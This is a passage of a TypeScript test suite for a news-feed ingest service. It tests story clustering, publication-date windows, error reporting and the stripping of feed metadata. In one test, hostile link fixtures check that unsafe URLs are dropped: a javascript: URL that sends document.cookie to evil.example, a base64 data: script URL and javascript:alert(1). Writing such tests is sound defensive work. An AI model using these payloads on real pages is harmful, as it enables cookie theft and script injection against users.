import { beforeEach, describe, expect, it } from 'vitest';

import { IngestService } from './ingest-service.js';
import type {
  FeedFetcher,
  RawFeed,
  RawFeedEntry,
} from './feed-fetcher.js';
import type { SourceRepo } from '../repos/source-repo.js';
import type { ArticleRepo } from '../repos/article-repo.js';
import type { StoryRepo } from '../repos/story-repo.js';
import type { EntityRepo } from '../repos/entity-repo.js';
import { DrizzleSourceRepo } from '../repos/source-repo.js';
import { DrizzleArticleRepo } from '../repos/article-repo.js';
import { DrizzleStoryRepo } from '../repos/story-repo.js';
import { DrizzleEntityRepo } from '../repos/entity-repo.js';
import { createTestDb } from '../testing/test-db.js';
import {
  deterministicRandom,
  makeTestClock,
  resetDeterministic,
} from '../testing/test-clocks.js';
import { UNRELATED_REPORTS, WIRE_COPIES } from '../testing/story-fixtures.js';
import {
  CITATION_PREFIXED_REPORTS,
  METADATA_ONLY_ITEMS,
  STANDFIRST_REPORTS,
} from '../testing/story-fixtures.js';
import { parseRss } from './rss-parser.js';
import { NO_BACKOFF } from '../domain/types.js';
import type { Source, SourceId } from '../domain/types.js';
import { isSafeExternalUrl } from '../domain/url.js';

class StaticFeedFetcher implements FeedFetcher {
  constructor(private readonly feed: RawFeed) {}
  async fetch(_url: string): Promise<RawFeed> {
    return this.feed;
  }
}

/**
 * A fetcher that serves XML and parses it with the production parser.
 *
 * The other tests here hand `IngestService` entries that have already been
 * parsed, which is a shape the pipeline is never actually given. That is how the
 * defect survived: what a feed reports about an item rather than describing it
 * was removed by the renderer and by nothing else, and every test signed
 * hand-written prose. Building the feed as XML and letting `parseRss` produce
 * the entries is the only version of this test that describes what happens.
 */
class XmlFeedFetcher implements FeedFetcher {
  constructor(private readonly xml: string) {}
  async fetch(_url: string): Promise<RawFeed> {
    return parseRss(this.xml);
  }
}

/** An RSS 2.0 document carrying these items, in the order they are given. */
function rssDocument(
  items: readonly { headline: string; body: string }[],
  linkFor: (item: { headline: string; body: string }, i: number) => string,
  published: (i: number) => Date,
): string {
  const escape = (s: string): string =>
    s
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;');
  return `<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0"><channel><title>Fixture</title>
${items
  .map(
    (item, i) => `  <item>
    <title>${escape(item.headline)}</title>
    <link>${escape(linkFor(item, i))}</link>
    <guid isPermaLink="false">item-${i}</guid>
    <pubDate>${published(i).toUTCString()}</pubDate>
    <description>${escape(item.body)}</description>
  </item>`,
  )
  .join('\n')}
</channel></rss>`;
}

class FailingFeedFetcher implements FeedFetcher {
  constructor(private readonly message: string) {}
  async fetch(): Promise<RawFeed> {
    throw new Error(this.message);
  }
}

function makeEntry(
  externalId: string,
  publishedAt: Date,
  title: string,
  body: string,
): RawFeedEntry {
  return {
    externalId,
    url: `https://www.reuters.com/article/${externalId}`,
    title,
    body,
    publishedAt,
  };
}

const HOUR = 60 * 60 * 1000;

/** A feed of one story as a syndication desk would have delivered it. */
const WIRE_ENTRIES: readonly RawFeedEntry[] = WIRE_COPIES.map((copy, i) =>
  makeEntry(
    `wire-${i}`,
    new Date(new Date('2026-09-02T10:00:00Z').getTime() + i * 60_000),
    copy.headline,
    copy.body,
  ),
);

/** A feed of reports about six different things, published in the same window. */
const UNRELATED_ENTRIES: readonly RawFeedEntry[] = UNRELATED_REPORTS.map(
  (report, i) =>
    makeEntry(
      `unrelated-${i}`,
      new Date(new Date('2026-09-02T10:00:00Z').getTime() + i * 10 * 60_000),
      report.headline,
      report.body,
    ),
);

const CLUSTER_B_ENTRIES: readonly RawFeedEntry[] = [
  makeEntry(
    'b-1',
    new Date('2026-09-02T12:00:00Z'),
    'BrandX Inc acquires TinyCo',
    'BrandX Inc said it had completed the acquisition of TinyCo for $2 billion, ending a process that began nine months ago. Shares in BrandX rose 4 percent in afternoon trading.',
  ),
  makeEntry(
    'b-2',
    new Date('2026-09-02T12:30:00Z'),
    'BrandX Inc completes TinyCo acquisition',
    'The $2 billion TinyCo takeover is complete, BrandX Inc said, after nine months of negotiations. Shares in BrandX rose 4 percent in afternoon trading.',
  ),
  makeEntry(
    'b-3',
    new Date('2026-09-02T13:00:00Z'),
    'TinyCo bought by BrandX Inc for $2 billion',
    'BrandX Inc has finished buying TinyCo for $2 billion, the company said on Tuesday. Shares in BrandX rose 4 percent in afternoon trading.',
  ),
];

interface BuildResult {
  readonly service: IngestService;
  readonly sourceRepo: SourceRepo;
  readonly articleRepo: ArticleRepo;
  readonly storyRepo: StoryRepo;
  readonly entityRepo: EntityRepo;
  readonly source: Source;
  readonly clock: ReturnType<typeof makeTestClock>;
  readonly replaceFetcher: (f: FeedFetcher) => void;
}

interface BuildInput {
  readonly entries?: RawFeed;
  readonly pollAt?: Date;
  readonly feedUrl?: string | null;
  readonly sourceId?: SourceId;
  readonly fetcher?: FeedFetcher;
}

async function buildService(input: BuildInput): Promise<BuildResult> {
  const { db } = createTestDb();
  const sr = new DrizzleSourceRepo(db);
  const ar = new DrizzleArticleRepo(db);
  const str = new DrizzleStoryRepo(db);
  const er = new DrizzleEntityRepo(db);

  const source: Source = {
    id: input.sourceId ?? ('reuters' as SourceId),
    slug: 'reuters',
    name: 'Reuters',
    homepageUrl: 'https://www.reuters.com',
    feedUrl:
      input.feedUrl === undefined
        ? 'https://www.reuters.com/rss/topNews'
        : input.feedUrl,
    lastPolledAt: null,
    lastSuccessAt: null,
    backoff: NO_BACKOFF,
  };
  await sr.insert(source);

  const pollAt = input.pollAt ?? new Date('2026-09-02T12:00:00Z');
  const clock = makeTestClock(pollAt);

  const initialFetcher: FeedFetcher =
    input.fetcher ??
    new StaticFeedFetcher(input.entries ?? { entries: [] });

  let activeFetcher: FeedFetcher = initialFetcher;

  const service = new IngestService({
    sourceRepo: sr,
    articleRepo: ar,
    storyRepo: str,
    entityRepo: er,
    feedFetcher: {
      fetch(url: string): Promise<RawFeed> {
        return activeFetcher.fetch(url);
      },
    },
    clock: clock.clock,
    random: deterministicRandom,
  });

  return {
    service,
    sourceRepo: sr,
    articleRepo: ar,
    storyRepo: str,
    entityRepo: er,
    source,
    clock,
    replaceFetcher(f: FeedFetcher): void {
      activeFetcher = f;
    },
  };
}

async function storyIdsFor(
  articleRepo: ArticleRepo,
  source: Source,
  entries: readonly RawFeedEntry[],
): Promise<Set<string>> {
  const ids = new Set<string>();
  for (const entry of entries) {
    const article = await articleRepo.findByExternalId(source.id, entry.externalId);
    if (article?.storyId) ids.add(article.storyId);
  }
  return ids;
}

describe('IngestService', () => {
  beforeEach(() => {
    resetDeterministic();
  });

  it('collapses 22 genuinely varied wire copies of one story into a single Story', async () => {
    const { service, storyRepo, articleRepo, source } = await buildService({
      entries: { entries: WIRE_ENTRIES },
    });

    const report = await service.ingestSource(source.id);

    expect(report.success).toBe(true);
    expect(report.fetched).toBe(22);
    expect(report.inserted + report.merged).toBe(22);
    expect(report.storiesAffected).toBe(1);

    // Every copy has a different headline and a different body, so this is not
    // the same input twenty-two times over.
    expect(new Set(WIRE_ENTRIES.map((e) => e.body)).size).toBe(22);
    expect(new Set(WIRE_ENTRIES.map((e) => e.title)).size).toBe(22);

    const seenStoryIds = await storyIdsFor(articleRepo, source, WIRE_ENTRIES);
    expect(seenStoryIds.size).toBe(1);
    const storyId = seenStoryIds.values().next().value as string;
    const story = await storyRepo.getById(storyId as never);
    expect(story?.articleCount).toBe(22);
  });

  it('keeps unrelated reports from the same window in separate Stories', async () => {
    const { service, storyRepo, articleRepo, source } = await buildService({
      entries: { entries: UNRELATED_ENTRIES },
    });

    const report = await service.ingestSource(source.id);

    expect(report.success).toBe(true);
    expect(report.storiesAffected).toBe(UNRELATED_REPORTS.length);
    const seenStoryIds = await storyIdsFor(articleRepo, source, UNRELATED_ENTRIES);
    expect(seenStoryIds.size).toBe(UNRELATED_REPORTS.length);
    for (const id of seenStoryIds) {
      const story = await storyRepo.getById(id as never);
      expect(story?.articleCount).toBe(1);
    }
  });

  it('persists the key phrases it signed an Article with, and reads them back', async () => {
    const { service, articleRepo, source } = await buildService({
      entries: { entries: [WIRE_ENTRIES[0]!] },
    });
    await service.ingestSource(source.id);

    const stored = await articleRepo.findByExternalId(source.id, 'wire-0');
    expect(stored).not.toBeNull();
    // Half of the matching key used to live only in memory during ingest and was
    // always read back empty.
    expect(stored?.signature.phrases.length).toBeGreaterThan(0);
    expect(stored?.signature.words.length).toBeGreaterThan(0);
    expect(stored?.signature.phrases).toContain('acme corp unveiled');
  });

  it('measures the dedup window from when an Article was published, not from when it was polled', async () => {
    // A feed that still lists a report from last week alongside today's. Both
    // are the same story in the same poll, and a window measured from the poll
    // would fold them into one Story.
    const copy = WIRE_COPIES[0]!;
    const pollAt = new Date('2026-09-02T12:00:00Z');
    const stale = new Date(pollAt.getTime() - 5 * 24 * HOUR);
    const entries: RawFeedEntry[] = [
      makeEntry('stale', stale, 'Acme unveils Foo, an AI assistant', copy.body),
      makeEntry(
        'current',
        pollAt,
        'Acme launches AI assistant Foo',
        WIRE_COPIES[1]!.body,
      ),
    ];
    const { service, storyRepo, articleRepo, source } = await buildService({
      entries: { entries },
      pollAt,
    });

    const report = await service.ingestSource(source.id);

    expect(report.success).toBe(true);
    expect(report.storiesAffected).toBe(2);
    const staleStoryId = (
      await articleRepo.findByExternalId(source.id, 'stale')
    )?.storyId;
    const currentStoryId = (
      await articleRepo.findByExternalId(source.id, 'current')
    )?.storyId;
    expect(staleStoryId).not.toBeNull();
    expect(staleStoryId).not.toBe(currentStoryId);
    expect((await storyRepo.getById(staleStoryId as never))?.articleCount).toBe(1);
    expect((await storyRepo.getById(currentStoryId as never))?.articleCount).toBe(
      1,
    );
  });

  it('clusters two distinct stories into separate Stories with correct article counts', async () => {
    const entries = [...WIRE_ENTRIES, ...CLUSTER_B_ENTRIES];
    const { service, storyRepo, articleRepo, source } = await buildService({
      entries: { entries },
    });
    const report = await service.ingestSource(source.id);
    expect(report.success).toBe(true);
    expect(report.storiesAffected).toBe(2);
    expect(report.fetched).toBe(entries.length);
    expect(report.inserted + report.merged).toBe(entries.length);

    const storyIds = new Set<string>();
    for (const e of entries) {
      const a = await articleRepo.findByExternalId(source.id, e.externalId);
      if (a?.storyId) storyIds.add(a.storyId);
    }
    expect(storyIds.size).toBe(2);

    const counts: number[] = [];
    for (const id of storyIds) {
      const articles = await articleRepo.listByStory(id as never);
      counts.push(articles.length);
    }
    expect([...counts].sort((a, b) => a - b)).toEqual([3, 22]);

    for (const id of storyIds) {
      const story = await storyRepo.getById(id as never);
      expect(story).not.toBeNull();
    }
  });

  it('is idempotent: re-ingesting the same feed reports no new merges', async () => {
    const entries = [...WIRE_ENTRIES, ...CLUSTER_B_ENTRIES];
    const { service, storyRepo, articleRepo, source } = await buildService({
      entries: { entries },
    });
    const r1 = await service.ingestSource(source.id);
    expect(r1.inserted + r1.merged).toBe(entries.length);
    const storyIdsAfterFirst = await storyIdsFor(articleRepo, source, entries);

    const r2 = await service.ingestSource(source.id);
    expect(r2.inserted).toBe(0);
    expect(r2.merged).toBe(0);
    expect(r2.fetched).toBe(entries.length);

    // And nothing moved: a second pass over the same feed is the same Stories.
    expect(await storyIdsFor(articleRepo, source, entries)).toEqual(
      storyIdsAfterFirst,
    );
    const counts: number[] = [];
    for (const id of storyIdsAfterFirst) {
      const story = await storyRepo.getById(id as never);
      counts.push(story?.articleCount ?? 0);
    }
    expect(counts.sort((a, b) => a - b)).toEqual([
      CLUSTER_B_ENTRIES.length,
      WIRE_ENTRIES.length,
    ]);
  });

  it('skips a source whose feed_url is null', async () => {
    const { service, sourceRepo, source } = await buildService({
      feedUrl: null,
    });
    const report = await service.ingestSource(source.id);
    expect(report.success).toBe(false);
    expect(report.error).toBe('no_feed_url');
    const after = await sourceRepo.getById(source.id);
    expect(after?.lastPolledAt).not.toBeNull();
    expect(after?.lastSuccessAt).toBeNull();
  });

  it('records a fetch error and does not record success', async () => {
    const { service, sourceRepo, source } = await buildService({
      fetcher: new FailingFeedFetcher('upstream 503'),
    });
    const report = await service.ingestSource(source.id);
    expect(report.success).toBe(false);
    expect(report.error).toMatch(/upstream 503/);
    const after = await sourceRepo.getById(source.id);
    expect(after?.lastPolledAt).not.toBeNull();
    expect(after?.lastSuccessAt).toBeNull();
  });

  it('returns a not_found error when the source id is unknown', async () => {
    const { service } = await buildService({});
    const report = await service.ingestSource('no-such-source' as SourceId);
    expect(report.success).toBe(false);
    expect(report.error).toBe('source_not_found');
    expect(report.storiesAffected).toBe(0);
  });

  it('persists the linked entities for each article', async () => {
    const { service, articleRepo, source } = await buildService({
      entries: { entries: WIRE_ENTRIES.slice(0, 2) },
    });
    await service.ingestSource(source.id);

    const sample = await articleRepo.findByExternalId(source.id, 'wire-0');
    expect(sample).not.toBeNull();
    expect(sample?.entities.length).toBeGreaterThan(0);
    const names = sample?.entities.map((e) => e.canonicalName) ?? [];
    expect(names).toContain('Acme Corp');

    // The same canonical entity is one row reused across Articles, not a fresh
    // one per Article, or nothing downstream can group by it.
    const sample2 = await articleRepo.findByExternalId(source.id, 'wire-1');
    const idOf = (article: typeof sample, name: string): string | undefined =>
      article?.entities.find((e) => e.canonicalName === name)?.id;
    expect(idOf(sample2, 'Acme Corp')).toBe(idOf(sample, 'Acme Corp'));
  });

  it('touches the story lastSeenAt when a new article merges into it', async () => {
    const firstEntry = WIRE_ENTRIES[0]!;
    const secondEntry = WIRE_ENTRIES[1]!;
    const { service, storyRepo, articleRepo, source, clock, replaceFetcher } =
      await buildService({
        entries: { entries: [firstEntry] },
      });
    const t0 = clock.clock.now();
    await service.ingestSource(source.id);

    const initialStoryId = (
      await articleRepo.findByExternalId(source.id, firstEntry.externalId)
    )?.storyId;
    expect(initialStoryId).not.toBeNull();
    if (!initialStoryId) throw new Error('expected a story id');
    const initialStory = await storyRepo.getById(initialStoryId as never);
    const firstSeen = initialStory?.firstSeenAt;
    expect(firstSeen?.getTime()).toBe(t0.getTime());

    clock.advance(HOUR);
    const t1 = clock.clock.now();
    replaceFetcher(
      new StaticFeedFetcher({
        entries: [secondEntry],
      }),
    );
    await service.ingestSource(source.id);

    const updated = await storyRepo.getById(initialStoryId as never);
    expect(updated?.lastSeenAt.getTime()).toBe(t1.getTime());
    expect(updated?.firstSeenAt.getTime()).toBe(firstSeen?.getTime());
  });

  it('widens the story published range as copies published around it arrive', async () => {
    const first = WIRE_ENTRIES[0]!;
    const later = {
      ...WIRE_ENTRIES[1]!,
      externalId: 'wire-later',
      publishedAt: new Date(first.publishedAt.getTime() + 30 * HOUR),
    };
    const { service, storyRepo, articleRepo, source, replaceFetcher } =
      await buildService({
        entries: { entries: [first] },
      });
    await service.ingestSource(source.id);
    const storyId = (
      await articleRepo.findByExternalId(source.id, 'wire-0')
    )?.storyId;
    if (!storyId) throw new Error('expected a story id');

    replaceFetcher(new StaticFeedFetcher({ entries: [later] }));
    await service.ingestSource(source.id);

    const story = await storyRepo.getById(storyId as never);
    expect(story?.articleCount).toBe(2);
    expect(story?.published.first).toEqual(first.publishedAt);
    expect(story?.published.last).toEqual(later.publishedAt);
  });

  it('does not merge articles that were published more than 72 hours apart', async () => {
    const copy = WIRE_COPIES[0]!;
    const t0 = new Date('2026-09-01T10:00:00Z');
    const tPast = new Date('2026-09-02T10:00:00Z');
    const tFuture = t0.getTime() + 5 * 24 * HOUR;
    const { service, storyRepo, articleRepo, source, replaceFetcher, clock } =
      await buildService({
        entries: {
          entries: [
            {
              ...makeEntry('old', t0, copy.headline, copy.body),
            },
          ],
        },
        pollAt: tPast,
      });
    await service.ingestSource(source.id);

    const initialStoryId = (
      await articleRepo.findByExternalId(source.id, 'old')
    )?.storyId;
    expect(initialStoryId).not.toBeNull();
    const before = await storyRepo.getById(initialStoryId as never);
    expect(before?.articleCount).toBe(1);

    clock.set(tFuture);
    replaceFetcher(
      new StaticFeedFetcher({
        entries: [
          makeEntry('new', new Date(tFuture), copy.headline, WIRE_COPIES[1]!.body),
        ],
      }),
    );
    const r2 = await service.ingestSource(source.id);
    expect(r2.success).toBe(true);
    expect(r2.storiesAffected).toBe(1);
    expect(r2.merged).toBe(0);
    expect(r2.inserted).toBe(1);

    const newStoryId = (
      await articleRepo.findByExternalId(source.id, 'new')
    )?.storyId;
    expect(newStoryId).not.toBeNull();
    expect(newStoryId).not.toBe(initialStoryId);

    const old = await storyRepo.getById(initialStoryId as never);
    expect(old?.articleCount).toBe(1);
    const fresh = await storyRepo.getById(newStoryId as never);
    expect(fresh?.articleCount).toBe(1);
  });

  it('does not let a chain of in-window copies walk a Story out of its window', async () => {
    // Each of these Articles is inside 72 hours of the one before it, so a Story
    // that accepted all of them would span more than two months — which is the
    // same mistake as measuring the window from when a poll happened.
    const first = WIRE_ENTRIES[0]!;
    const entries: RawFeedEntry[] = [first];
    for (let i = 1; i < 8; i++) {
      entries.push({
        ...WIRE_ENTRIES[i]!,
        externalId: `chain-${i}`,
        publishedAt: new Date(first.publishedAt.getTime() + i * 60 * HOUR),
      });
    }
    const { service, storyRepo, articleRepo, source } = await buildService({
      entries: { entries },
      pollAt: new Date(first.publishedAt.getTime() + 7 * 60 * HOUR),
    });

    await service.ingestSource(source.id);

    // The invariant that matters is not how many Stories this made, but that no
    // Story ended up wider than the window: a chain of near-duplicates can open
    // new Stories, never stretch one.
    const storyIds = await storyIdsFor(articleRepo, source, entries);
    expect(storyIds.size).toBeGreaterThan(1);
    for (const id of storyIds) {
      const story = await storyRepo.getById(id as never);
      const spanHours =
        (story!.published.last.getTime() - story!.published.first.getTime()) /
        HOUR;
      expect(spanHours, `story ${id} spans ${spanHours}h`).toBeLessThanOrEqual(72);
    }
  });

  it('merges copies published inside the 72-hour window', async () => {
    const copy = WIRE_COPIES[0]!;
    const t0 = new Date('2026-09-01T10:00:00Z');
    const tInside = new Date('2026-09-02T10:00:00Z');
    const tJustInside = t0.getTime() + 71 * HOUR;
    const { service, storyRepo, articleRepo, source, replaceFetcher, clock } =
      await buildService({
        entries: {
          entries: [makeEntry('first', t0, copy.headline, copy.body)],
        },
        pollAt: tInside,
      });
    await service.ingestSource(source.id);
    clock.set(new Date(tJustInside));

    replaceFetcher(
      new StaticFeedFetcher({
        entries: [
          makeEntry(
            'second',
            new Date(tJustInside),
            WIRE_COPIES[1]!.headline,
            WIRE_COPIES[1]!.body,
          ),
        ],
      }),
    );
    const r2 = await service.ingestSource(source.id);
    expect(r2.storiesAffected).toBe(1);
    expect(r2.merged).toBe(1);

    const firstStoryId = (
      await articleRepo.findByExternalId(source.id, 'first')
    )?.storyId;
    const secondStoryId = (
      await articleRepo.findByExternalId(source.id, 'second')
    )?.storyId;
    expect(firstStoryId).toBe(secondStoryId);
    const merged = firstStoryId
      ? await storyRepo.getById(firstStoryId as never)
      : null;
    expect(merged?.articleCount).toBe(2);
  });

  it('records a success when a poll finds nothing new, so a healthy Source is not reported stale', async () => {
    const entry = WIRE_ENTRIES[0]!;
    const { service, sourceRepo, source, clock, replaceFetcher } = await buildService({
      entries: { entries: [entry] },
    });

    const first = await service.ingestSource(source.id);
    expect(first.success).toBe(true);
    const firstSuccessAt = (await sourceRepo.getById(source.id))?.lastSuccessAt;
    expect(firstSuccessAt).not.toBeNull();

    // The second poll sees the same feed and inserts nothing. It still worked,
    // so the Source's last success has to move or the dashboard calls it stale.
    clock.advance(HOUR);
    replaceFetcher(new StaticFeedFetcher({ entries: [entry] }));
    const second = await service.ingestSource(source.id);
    expect(second.success).toBe(true);
    expect(second.inserted).toBe(0);
    expect(second.merged).toBe(0);

    const secondSuccessAt = (await sourceRepo.getById(source.id))?.lastSuccessAt;
    expect(secondSuccessAt).not.toBeNull();
    expect(secondSuccessAt!.getTime()).toBeGreaterThan(firstSuccessAt!.getTime());
  });

  it('records a success for an empty feed', async () => {
    const { service, sourceRepo, source } = await buildService({
      entries: { entries: [] },
    });

    const report = await service.ingestSource(source.id);

    expect(report.success).toBe(true);
    expect((await sourceRepo.getById(source.id))?.lastSuccessAt).not.toBeNull();
  });

  it('stores a link the feed gave us only when the scheme is safe to link to', async () => {
    const copy = WIRE_COPIES[0]!.body;
    const entries: RawFeedEntry[] = [
      makeEntry(
        'good',
        new Date('2026-09-02T10:00:00Z'),
        'Acme Corp ships a widget',
        copy,
      ),
      {
        externalId: 'hostile-js',
        url: 'javascript:fetch("https://evil.example/"+document.cookie)',
        title: 'Acme Corp ships a gadget',
        body: copy,
        publishedAt: new Date('2026-09-02T10:05:00Z'),
      },
      {
        externalId: 'hostile-data',
        url: 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
        title: 'Acme Corp ships a gizmo',
        body: copy,
        publishedAt: new Date('2026-09-02T10:10:00Z'),
      },
    ];
    const { service, articleRepo, source } = await buildService({
      entries: { entries },
    });

    const report = await service.ingestSource(source.id);

    // The Articles are still kept: their text is what clustering works from.
    expect(report.success).toBe(true);
    expect(report.inserted + report.merged).toBe(3);
    for (const e of entries) {
      const stored = await articleRepo.findByExternalId(source.id, e.externalId);
      expect(stored, e.externalId).not.toBeNull();
      // The invariant is that nothing stored is a link a browser will navigate
      // somewhere unexpected. An empty url is that: there is no link to click.
      const navigable = stored!.url !== '' && isSafeExternalUrl(stored!.url);
      expect(
        stored!.url === '' || navigable,
        `${e.externalId} stored ${JSON.stringify(stored!.url)}`,
      ).toBe(true);
    }
    expect((await articleRepo.findByExternalId(source.id, 'good'))?.url).toBe(
      'https://www.reuters.com/article/good',
    );
    // A refused link is stored as nothing rather than as a sentinel a renderer
    // has to know to check.
    expect((await articleRepo.findByExternalId(source.id, 'hostile-js'))?.url).toBe('');
    expect((await articleRepo.findByExternalId(source.id, 'hostile-data'))?.url).toBe('');
  });

  it('keeps a hostile entry in the Story its safe siblings would join', async () => {
    const copy = WIRE_COPIES[0]!;
    const { service, storyRepo, articleRepo, source } = await buildService({
      entries: {
        entries: [
          makeEntry(
            'safe-one',
            new Date('2026-09-02T10:00:00Z'),
            copy.headline,
            copy.body,
          ),
          {
            externalId: 'hostile',
            url: 'javascript:alert(1)',
            title: WIRE_COPIES[1]!.headline,
            body: WIRE_COPIES[1]!.body,
            publishedAt: new Date('2026-09-02T10:05:00Z'),
          },
        ],
      },
    });

    await service.ingestSource(source.id);

    const safeStory = (
      await articleRepo.findByExternalId(source.id, 'safe-one')
    )?.storyId;
    const hostileStory = (
      await articleRepo.findByExternalId(source.id, 'hostile')
    )?.storyId;
    expect(safeStory).not.toBeNull();
    expect(hostileStory).not.toBeNull();
    // Same event, differently worded; the difference is only the link.
    expect(hostileStory).toBe(safeStory);
    const story = await storyRepo.getById(safeStory as never);
    expect(story?.articleCount).toBe(2);
  });
});

/**
 * What the pipeline does with the text a real feed actually serves.
 *
 * Every test above hands `IngestService` entries that have already been parsed,
 * which is the one shape the defect got through: the fixtures were written as
 * ordinary prose, so nothing in the suite ever saw what hnrss.org or nature.com
 * put in `<description>`, and a rule built only for the renderer protected the
 * sentences a User reads while the signature and the Entities went on reading a
 * DOI and a comment count as though an outlet had written them.
 */
describe('IngestService over a real feed document', () => {
  beforeEach(() => {
    resetDeterministic();
  });

  const publishedAt = (i: number): Date =>
    new Date(new Date('2026-09-02T10:00:00Z').getTime() + i * 60_000);

  it('gives every item of a feed that reports rather than describes a Story of its own', async () => {
    // These six have nothing to do with one another — an obituary, a RuneScape
    // announcement and a database project among them — and the only text they
    // carry is hnrss.org's own bookkeeping. Signed as it stands, they differ
    // only in digits the word pattern discards, so they collapsed into one Story
    // and every Hacker News Article in the database was compared against every
    // other one.
    const { service, articleRepo, storyRepo, source } = await buildService({
      fetcher: new XmlFeedFetcher(
        rssDocument(
          METADATA_ONLY_ITEMS,
          (item, i) => `https://news.ycombinator.com/item?id=4995${1000 + i}`,
          publishedAt,
        ),
      ),
    });

    const report = await service.ingestSource(source.id);

    expect(report.success).toBe(true);
    expect(report.inserted).toBe(METADATA_ONLY_ITEMS.length);
    expect(report.merged).toBe(0);
    expect(report.storiesAffected).toBe(METADATA_ONLY_ITEMS.length);

    const storyIds = new Set<string>();
    for (let i = 0; i < METADATA_ONLY_ITEMS.length; i++) {
      const stored = await articleRepo.findByExternalId(source.id, `item-${i}`);
      expect(stored, `item-${i}`).not.toBeNull();
      if (stored?.storyId) storyIds.add(stored.storyId);
    }
    expect(storyIds.size).toBe(METADATA_ONLY_ITEMS.length);
  });

  it('keeps the headline of an item the feed gave no prose for', async () => {
    // The body's text is the feed's bookkeeping, so the headline is the only
    // thing an outlet wrote. Signed from the body alone, every one of these
    // signed as the same empty signature, and CONTEXT.md's rule that a feed's
    // metadata is not a statement a Source made became a rule that left nothing
    // to compare at all.
    const { service, articleRepo, source } = await buildService({
      fetcher: new XmlFeedFetcher(
        rssDocument(
          METADATA_ONLY_ITEMS,
          (_item, i) => `https://news.ycombinator.com/item?id=4995${1000 + i}`,
          publishedAt,
        ),
      ),
    });
    await service.ingestSource(source.id);

    const stored = await articleRepo.findByExternalId(source.id, 'item-0');
    expect(stored?.signature.words.length).toBeGreaterThan(0);
    expect(stored?.signature.phrases.length).toBeGreaterThan(0);
  });

  it('stores no feed bookkeeping as an Article body, while keeping the link', async () => {
    const { service, articleRepo, source } = await buildService({
      fetcher: new XmlFeedFetcher(
        rssDocument(
          METADATA_ONLY_ITEMS,
          (_item, i) => `https://news.ycombinator.com/item?id=4995${1000 + i}`,
          publishedAt,
        ),
      ),
    });
    await service.ingestSource(source.id);

    const stored = await articleRepo.findByExternalId(source.id, 'item-0');
    expect(stored?.body).toBe('');
    expect(stored?.body).not.toMatch(/Points:/);
    // The body's copy of the link is redundant with the <link> element, and
    // dropping it must not cost the Article something a brief can point at.
    expect(stored?.url).toBe('https://news.ycombinator.com/item?id=49951000');
  });

  it('names nothing out of a feed reporting on an item', async () => {
    const { service, articleRepo, source } = await buildService({
      fetcher: new XmlFeedFetcher(
        rssDocument(
          METADATA_ONLY_ITEMS,
          (_item, i) => `https://news.ycombinator.com/item?id=4995${1000 + i}`,
          publishedAt,
        ),
      ),
    });
    await service.ingestSource(source.id);

    for (let i = 0; i < METADATA_ONLY_ITEMS.length; i++) {
      const stored = await articleRepo.findByExternalId(source.id, `item-${i}`);
      const names = (stored?.entities ?? []).map((e) => e.canonicalName);
      for (const noise of ['Points Comments', 'Comments', 'URL', 'Article']) {
        expect(names, `item-${i} named ${noise}`).not.toContain(noise);
      }
    }
  });

  it('does not let a citation header make every Article of a feed look alike', async () => {
    // nature.com prefixes its standfirst with the publication, the date and the
    // DOI. That prefix is most of the text, so twenty-two unrelated Nature
    // Articles were one Story and `Nature Published` was attached to 75 of them.
    const { service, articleRepo, source } = await buildService({
      fetcher: new XmlFeedFetcher(
        rssDocument(
          CITATION_PREFIXED_REPORTS,
          (_item, i) => `https://www.nature.com/articles/d41586-026-0300${i}`,
          publishedAt,
        ),
      ),
    });

    const report = await service.ingestSource(source.id);

    expect(report.success).toBe(true);
    expect(report.merged).toBe(0);
    const storyIds = new Set<string>();
    for (let i = 0; i < CITATION_PREFIXED_REPORTS.length; i++) {
      const stored = await articleRepo.findByExternalId(source.id, `item-${i}`);
      expect(stored?.body, `item-${i}`).not.toMatch(/doi:/);
      expect(stored?.body, `item-${i}`).not.toMatch(/Published online/);
      if (stored?.storyId) storyIds.add(stored.storyId);
    }
    expect(storyIds.size).toBe(CITATION_PREFIXED_REPORTS.length);
  });

  it('keeps the standfirst an outlet wrote, which is the sentence an Article has', async () => {
    // A short body is not a broken body. Nine of the twenty registry Sources
    // serve one editorial sentence in `<description>` and nothing else, and it
    // is the best text they give — 1,032 of 1,483 Articles in a day of live
    // ingest were under 200 characters because of it. A rule built to strip feed
    // metadata that also ate these would leave those Sources with nothing.
    const { service, articleRepo, source } = await buildService({
      fetcher: new XmlFeedFetcher(
        rssDocument(
          STANDFIRST_REPORTS,
          (_item, i) => `https://example.com/standfirst-${i}`,
          publishedAt,
        ),
      ),
    });
    await service.ingestSource(source.id);

    for (let i = 0; i < STANDFIRST_REPORTS.length; i++) {
      const expected = STANDFIRST_REPORTS[i]!.body;
      const stored = await articleRepo.findByExternalId(source.id, `item-${i}`);
      expect(stored?.body, `item-${i}`).toBe(expected);
      expect(stored?.signature.words.length, `item-${i}`).toBeGreaterThan(0);
    }
  });

  it('reads the entities in a standfirst, which is where a short Article names its subject', async () => {
    const { service, articleRepo, source } = await buildService({
      fetcher: new XmlFeedFetcher(
        rssDocument(
          STANDFIRST_REPORTS,
          (_item, i) => `https://example.com/standfirst-${i}`,
          publishedAt,
        ),
      ),
    });
    await service.ingestSource(source.id);

    const russia = await articleRepo.findByExternalId(source.id, 'item-4');
    const names = (russia?.entities ?? []).map((e) => e.canonicalName);
    expect(names).toContain('Russia');
  });

  it('decodes the entities an outlet writes its prose with, before anything is read out of it', async () => {
    // Left encoded, "&ldquo;" is a word nothing else in the Article shares, so it
    // is a phrase and a name that no rewrite of the same sentence will ever
    // match — and it reaches a User verbatim inside a quoted brief.
    const { service, articleRepo, source } = await buildService({
      fetcher: new XmlFeedFetcher(
        rssDocument(
          [
            {
              headline: 'How the brain uses memory to imagine what might have been',
              body: 'Philosopher and 2026 MacArthur &ldquo;genius grant&rdquo; recipient Felipe De Brigard &mdash; the end &#8230;',
            },
          ],
          () => 'https://www.scientificamerican.com/article/brain-memory',
          publishedAt,
        ),
      ),
    });
    await service.ingestSource(source.id);

    const stored = await articleRepo.findByExternalId(source.id, 'item-0');
    expect(stored?.body).toContain('MacArthur “genius grant”');
    expect(stored?.body).not.toContain('&ldquo;');
    expect(stored?.body).not.toContain('&#8230;');
    const names = (stored?.entities ?? []).map((e) => e.canonicalName);
    expect(names).toContain('Felipe De Brigard');
  });

  it('names nothing out of the furniture a feed appends to an item', async () => {
